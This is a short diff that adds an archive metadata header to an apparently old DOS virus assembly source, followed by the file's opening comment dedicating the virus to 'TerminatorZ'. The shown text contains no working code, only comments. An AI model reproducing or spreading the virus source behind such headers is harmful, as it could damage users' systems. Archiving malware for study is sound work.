@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; RIP TerminatorZ
 ;
 ; This virus is dedicated to the great TerminatorZ who recently died of an
